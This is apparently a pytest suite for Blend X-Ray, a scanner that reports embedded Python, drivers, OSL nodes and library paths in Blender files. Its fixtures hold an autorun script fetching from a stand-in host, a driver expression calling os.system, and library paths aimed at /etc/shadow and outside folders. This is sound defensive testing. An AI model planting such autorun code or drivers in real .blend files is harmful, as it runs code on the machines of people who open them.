# SPDX-License-Identifier: GPL-3.0-or-later
"""End-to-end scanner and CLI tests against synthetically built .blend files."""

from __future__ import annotations

import io
import json
import locale
from pathlib import Path

import pytest

from blend_xray import cli, guards, report, scanner, strings
from blend_xray.scanner import classify_library_path

from .blend_builder import BlendBuilder, minimal_blend
from .conftest import BANNED_WORDS_BY_LANG

AUTORUN_SCRIPT = """
import urllib.request
data = urllib.request.urlopen("http://drop.example-host.top/p").read()
"""

PANEL_SCRIPT = """
import bpy
class X_PT_p(bpy.types.Panel):
    bl_label = "X"
"""


@pytest.fixture
def hostile_blend(tmp_path: Path) -> Path:
    builder = BlendBuilder()
    builder.add_text("autorun.py", AUTORUN_SCRIPT, flags=1 | 4 | 16)  # TXT_ISSCRIPT
    builder.add_text("panel.py", PANEL_SCRIPT, flags=4)
    builder.add_library("//lib/props.blend")
    builder.add_library("//../../outside/secret.blend")
    builder.add_driver("frame * 2", dtype=1)
    builder.add_driver("__import__('os').system('calc')", dtype=1, flag=64)
    builder.add_script_node(1, filepath="//shaders/s.osl", bytecode_hash="abc")
    path = tmp_path / "hostile.blend"
    path.write_bytes(builder.to_bytes())
    return path


@pytest.fixture
def empty_blend(tmp_path: Path) -> Path:
    path = tmp_path / "empty.blend"
    path.write_bytes(minimal_blend())
    return path


# -- happy path ------------------------------------------------------------
def test_scan_valid_blend_with_no_code(empty_blend: Path) -> None:
    result = scanner.scan_file(empty_blend)
    assert result.has_findings is False
    assert result.texts == []
    assert len(result.categories_checked) == 5
    assert result.warnings == []


def test_scan_reads_file_format_version_1(tmp_path: Path) -> None:
    """The whole pipeline, not just the guard, must handle the 5.0 layout.

    blender-asset-tracer 1.23 already understands ``LargeBHead8``; this proves
    the header Blend X-Ray hands it and the one BAT re-reads agree.
    """
    builder = BlendBuilder()
    builder.add_text("notes.py", "import bpy\n", flags=1)
    path = tmp_path / "v1.blend"
    path.write_bytes(builder.to_bytes(b"500", large_header=True))

    result = scanner.scan_file(path)
    assert result.blender_version == "500"
    assert result.pointer_size == 8
    assert result.block_count >= 2
    assert [t.name for t in result.texts] == ["notes.py"]


def test_file_meta_line_reports_the_new_version(tmp_path: Path) -> None:
    """Displayed the way Blender writes it, with the raw integer kept for --json."""
    path = tmp_path / "v1.blend"
    path.write_bytes(minimal_blend(large_header=True))
    result = scanner.scan_file(path)
    assert "5.0" in report.file_meta_line(result)
    assert "500" not in report.file_meta_line(result)
    assert result.blender_version == "500"
    assert result.to_dict()["blender_version"] == "500"


def test_scan_finds_autorun_text(hostile_blend: Path) -> None:
    result = scanner.scan_file(hostile_blend)
    assert len(result.texts) == 2
    autorun = result.autorun_texts
    assert len(autorun) == 1
    assert autorun[0].name == "autorun.py"
    assert "TXT_ISSCRIPT" in autorun[0].flag_names
    assert "urllib" in autorun[0].source


def test_non_autorun_text_is_still_reported(hostile_blend: Path) -> None:
    """Every text datablock is inventoried, not only the flagged ones."""
    result = scanner.scan_file(hostile_blend)
    names = {t.name for t in result.texts}
    assert names == {"autorun.py", "panel.py"}
    panel = next(t for t in result.texts if t.name == "panel.py")
    assert panel.is_autorun is False


def test_text_explanation_is_attached(hostile_blend: Path) -> None:
    result = scanner.scan_file(hostile_blend)
    autorun = result.autorun_texts[0]
    assert autorun.explanation is not None
    assert autorun.explanation.alarming is True


def test_null_filepath_is_none_not_zero(hostile_blend: Path) -> None:
    """A null `char *filepath` must not render as the string '0'."""
    result = scanner.scan_file(hostile_blend)
    for finding in result.texts:
        assert finding.filepath != "0"
        assert finding.filepath is None


def test_drivers_are_classified(hostile_blend: Path) -> None:
    result = scanner.scan_file(hostile_blend)
    assert len(result.drivers) == 2
    simple = [d for d in result.drivers if d.is_simple]
    suspicious = [d for d in result.drivers if not d.is_simple]
    assert len(simple) == 1 and len(suspicious) == 1
    assert suspicious[0].driver_type_name == "DRIVER_TYPE_PYTHON"
    assert "DRIVER_FLAG_USE_SELF" in suspicious[0].flag_names


def test_osl_node_is_reported(hostile_blend: Path) -> None:
    result = scanner.scan_file(hostile_blend)
    assert len(result.osl_nodes) == 1
    node = result.osl_nodes[0]
    assert node.mode_name == "NODE_SCRIPT_EXTERNAL"
    assert node.filepath == "//shaders/s.osl"


def test_libraries_are_classified(hostile_blend: Path) -> None:
    result = scanner.scan_file(hostile_blend)
    assert len(result.libraries) == 2
    escaping = [lib for lib in result.libraries if lib.escapes_folder]
    assert len(escaping) == 1
    assert escaping[0].raw_path == "//../../outside/secret.blend"


# -- library path classification -------------------------------------------
def test_relative_path_inside_folder(tmp_path: Path) -> None:
    finding = classify_library_path("//textures/wood.blend", tmp_path)
    assert finding.is_relative and not finding.notable


def test_relative_path_escaping_folder(tmp_path: Path) -> None:
    finding = classify_library_path("//../../etc/passwd", tmp_path)
    assert finding.escapes_folder is True and finding.notable


def test_unc_path_is_flagged(tmp_path: Path) -> None:
    finding = classify_library_path(r"\\fileserver\share\rig.blend", tmp_path)
    assert finding.is_unc is True
    assert finding.unc_host == "fileserver"
    assert finding.notable is True


def test_drive_letter_path_is_flagged(tmp_path: Path) -> None:
    finding = classify_library_path(r"C:\Users\victim\thing.blend", tmp_path)
    assert finding.has_drive_letter is True and finding.is_absolute and finding.notable


def test_posix_absolute_path_is_flagged(tmp_path: Path) -> None:
    finding = classify_library_path("/etc/shadow", tmp_path)
    assert finding.is_absolute is True and finding.notable


def test_leading_backslash_is_absolute(tmp_path: Path) -> None:
    finding = classify_library_path(r"\windows\system32\x.blend", tmp_path)
    assert finding.is_absolute is True


# -- error paths -----------------------------------------------------------
def test_scan_rejects_non_blend(tmp_path: Path) -> None:
    path = tmp_path / "fake.blend"
    path.write_bytes(b"not a blend at all")
    with pytest.raises(guards.NotABlendFileError):
        scanner.scan_file(path)


def test_scan_rejects_truncated(tmp_path: Path) -> None:
    full = minimal_blend()
    path = tmp_path / "trunc.blend"
    path.write_bytes(full[:20])
    with pytest.raises(guards.MalformedBlendError):
        scanner.scan_file(path)


def test_bat_version_is_asserted() -> None:
    assert scanner.assert_bat_version() == scanner.REQUIRED_BAT_VERSION


def test_bat_2x_is_refused_with_a_clear_message(monkeypatch: pytest.MonkeyPatch) -> None:
    """BAT 2.x needs a Blender install, which would defeat the whole tool."""
    import importlib.metadata as md

    monkeypatch.setattr(md, "version", lambda _name: "2.0.1")
    with pytest.raises(scanner.ToolError) as exc:
        scanner.assert_bat_version()
    message = str(exc.value)
    assert "2.0.1" in message
    assert "1.23" in message
    assert "requirements.txt" in message  # tells the user how to fix it


def test_missing_bat_is_reported(monkeypatch: pytest.MonkeyPatch) -> None:
    import importlib.metadata as md

    def _raise(_name: str) -> str:
        raise md.PackageNotFoundError(_name)

    monkeypatch.setattr(md, "version", _raise)
    with pytest.raises(scanner.ToolError) as exc:
        scanner.assert_bat_version()
    assert "not installed" in str(exc.value)


def test_cli_reports_wrong_bat_version(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    import importlib.metadata as md

    monkeypatch.setattr(md, "version", lambda _name: "2.0.1")
    code, _, err = _run(["scan", str(tmp_path)])
    assert code == cli.EXIT_TOOL_ERROR
    assert "1.23" in err


# -- report ----------------------------------------------------------------
# The banned-word table lives in conftest so that the GUI's own assertion
# (tests/test_gui.py) uses the very same list -- see BANNED_WORDS_BY_LANG.
_BANNED_WORDS_BY_LANG = BANNED_WORDS_BY_LANG


def test_report_never_says_safe(tmp_path: Path, hostile_blend: Path, empty_blend: Path) -> None:
    """The single most important property of the output, in every language.

    The tmp root is stripped before asserting: pytest names its temp directory
    after this test, so every path echoed in the report (the scanned file and
    every resolved library path under it) contains the word "safe" and would
    fail the check for reasons unrelated to the report's wording.

    The tool name is deliberately NOT stripped, so a future rename back to
    something containing a banned word fails here.
    """
    pal = report.make_palette(io.StringIO(), force=False)
    for lang, banned_words in _BANNED_WORDS_BY_LANG.items():
        strings.set_language(lang)
        for path in (hostile_blend, empty_blend):
            text = report.format_text_report(scanner.scan_file(path), pal).lower()
            text = text.replace(str(tmp_path).lower(), "<tmp>")
            for banned in banned_words:
                assert banned not in text, f"[{lang}] report must never say {banned!r}"


def test_report_lists_categories_when_nothing_found(empty_blend: Path) -> None:
    pal = report.make_palette(io.StringIO(), force=False)
    text = report.format_text_report(scanner.scan_file(empty_blend), pal)
    assert "No embedded code found in the categories checked" in text
    for label in (
        "Python text blocks",
        "Driver expressions",
        "OSL / script nodes",
        "Linked libraries",
        "Other datablock file paths",
    ):
        assert label in text


def test_report_shows_source_and_explanation(hostile_blend: Path) -> None:
    pal = report.make_palette(io.StringIO(), force=False)
    text = report.format_text_report(scanner.scan_file(hostile_blend), pal)
    assert "connects to the internet" in text
    assert "urllib.request.urlopen" in text  # the actual source body
    assert "http://drop.example-host.top/p" in text  # the extracted literal


def test_explanation_precedes_source_in_output(hostile_blend: Path) -> None:
    pal = report.make_palette(io.StringIO(), force=False)
    text = report.format_text_report(scanner.scan_file(hostile_blend), pal)
    assert text.index("connects to the internet") < text.index("Source:")


def test_palette_degrades_when_piped() -> None:
    piped = report.Palette(io.StringIO(), force=None)
    assert piped.enabled is False
    assert "\033[" not in piped.alarm("x")


def test_truncation_flag(hostile_blend: Path) -> None:
    pal = report.make_palette(io.StringIO(), force=False)
    result = scanner.scan_file(hostile_blend)
    result.texts[0] = type(result.texts[0])(**{**result.texts[0].__dict__, "source": "x" * 5000})
    text = report.format_text_report(result, pal, full=False)
    assert "--full" in text
    full_text = report.format_text_report(result, pal, full=True)
    assert "--full" not in full_text


# -- CLI -------------------------------------------------------------------
def _run(args: list[str]) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    code = cli.run(args, stdout=out, stderr=err)
    return code, out.getvalue(), err.getvalue()


def test_cli_exit_zero_when_nothing_found(empty_blend: Path) -> None:
    code, out, _ = _run(["scan", str(empty_blend)])
    assert code == cli.EXIT_OK
    assert "No embedded code found" in out


def test_cli_exit_one_when_findings(hostile_blend: Path) -> None:
    code, out, _ = _run(["scan", str(hostile_blend)])
    assert code == cli.EXIT_FINDINGS
    assert "autorun.py" in out


def test_cli_exit_two_when_malformed(tmp_path: Path) -> None:
    bad = tmp_path / "bad.blend"
    bad.write_bytes(b"nope not a blend file")
    code, _, err = _run(["scan", str(bad)])
    assert code == cli.EXIT_MALFORMED
    assert "not a Blender file" in err


def test_cli_json_output(hostile_blend: Path) -> None:
    code, out, _ = _run(["scan", "--json", str(hostile_blend)])
    assert code == cli.EXIT_FINDINGS
    payload = json.loads(out)
    assert payload["schema"] == 1
    file_entry = payload["files"][0]
    assert file_entry["has_findings"] is True
    assert len(file_entry["texts"]) == 2
    assert file_entry["texts"][0]["explanation"]["statements"]


def test_cli_json_reports_errors(tmp_path: Path) -> None:
    bad = tmp_path / "bad.blend"
    bad.write_bytes(b"nope")
    code, out, _ = _run(["scan", "--json", str(bad)])
    assert code == cli.EXIT_MALFORMED
    payload = json.loads(out)
    assert payload["errors"][0]["kind"] == "not_a_blend"


def test_cli_scans_directory_recursively(tmp_path: Path, hostile_blend: Path) -> None:
    nested = tmp_path / "nested"
    nested.mkdir()
    (nested / "copy.blend").write_bytes(hostile_blend.read_bytes())
    code, out, _ = _run(["scan", str(tmp_path)])
    assert code == cli.EXIT_FINDINGS
    assert out.count("autorun.py") >= 2


def test_cli_glob_pattern(tmp_path: Path, hostile_blend: Path) -> None:
    code, out, _ = _run(["scan", str(tmp_path / "*.blend")])
    assert code == cli.EXIT_FINDINGS


def test_cli_no_match_is_tool_error(tmp_path: Path) -> None:
    code, _, err = _run(["scan", str(tmp_path / "nothing-here-*.blend")])
    assert code == cli.EXIT_TOOL_ERROR
    assert "No .blend files matched" in err


def test_cli_quiet_suppresses_context(hostile_blend: Path) -> None:
    _, verbose, _ = _run(["scan", str(hostile_blend)])
    _, quiet, _ = _run(["scan", "--quiet", str(hostile_blend)])
    assert "Checked 5 categories" in verbose
    assert "Checked 5 categories" not in quiet
    assert len(quiet) < len(verbose)


def test_cli_color_never_has_no_escapes(hostile_blend: Path) -> None:
    _, out, _ = _run(["scan", "--color", "never", str(hostile_blend)])
    assert "\033[" not in out


def test_cli_color_always_has_escapes(hostile_blend: Path) -> None:
    _, out, _ = _run(["scan", "--color", "always", str(hostile_blend)])
    assert "\033[" in out


# -- CLI language selection --------------------------------------------------
def test_cli_defaults_to_english(empty_blend: Path) -> None:
    """The autouse conftest fixture neutralises OS-locale detection to English."""
    code, out, _ = _run(["scan", str(empty_blend)])
    assert code == cli.EXIT_OK
    assert "No embedded code found" in out


def test_cli_lang_flag_selects_french(empty_blend: Path) -> None:
    code, out, _ = _run(["--lang", "fr", "scan", str(empty_blend)])
    assert code == cli.EXIT_OK
    assert "Aucun code intégré trouvé" in out


def test_cli_lang_flag_overrides_locale_detection(
    monkeypatch: pytest.MonkeyPatch, empty_blend: Path
) -> None:
    """A French OS locale must not win over an explicit --lang en."""
    monkeypatch.setattr(locale, "getlocale", lambda: ("fr_FR", "cp1252"))
    code, out, _ = _run(["--lang", "en", "scan", str(empty_blend)])
    assert code == cli.EXIT_OK
    assert "No embedded code found" in out


def test_cli_auto_detects_french_locale_when_lang_omitted(
    monkeypatch: pytest.MonkeyPatch, empty_blend: Path
) -> None:
    monkeypatch.setattr(locale, "getlocale", lambda: ("fr_FR", "cp1252"))
    code, out, _ = _run(["scan", str(empty_blend)])
    assert code == cli.EXIT_OK
    assert "Aucun code intégré trouvé" in out


def test_cli_json_lang_field_defaults_to_english(hostile_blend: Path) -> None:
    _, out, _ = _run(["scan", "--json", str(hostile_blend)])
    payload = json.loads(out)
    assert payload["lang"] == "en"


def test_cli_json_lang_field_follows_lang_flag(hostile_blend: Path) -> None:
    _, out, _ = _run(["--lang", "fr", "scan", "--json", str(hostile_blend)])
    payload = json.loads(out)
    assert payload["lang"] == "fr"
    # Keys, severities and identifiers stay stable regardless of language --
    # only the human-readable text (and now the "lang" field) vary.
    statement = payload["files"][0]["texts"][0]["explanation"]["statements"][0]
    assert statement["key"] == "x_network"
    assert statement["severity"] == "ALARMING"


def test_cli_json_is_pure_ascii_regardless_of_language(hostile_blend: Path) -> None:
    """French text embeds accented characters; the JSON bytes must not.

    On Windows, sys.stdout defaults to the console codepage (cp1252), not
    UTF-8. json.dumps(..., ensure_ascii=False) would let print() write raw
    accented bytes through that stream, producing a payload that is not valid
    UTF-8 -- undermining the very "machine-parseable regardless of locale"
    property --json exists for. Escaping non-ASCII as \\uXXXX sidesteps the
    stream encoding entirely.
    """
    _, out, _ = _run(["--lang", "fr", "scan", "--json", str(hostile_blend)])
    out.encode("ascii")  # raises UnicodeEncodeError if any raw non-ASCII slipped through
    payload = json.loads(out)
    statement = payload["files"][0]["texts"][0]["explanation"]["statements"][0]
    assert "à" in statement["text"]  # the escape decodes back to the real character
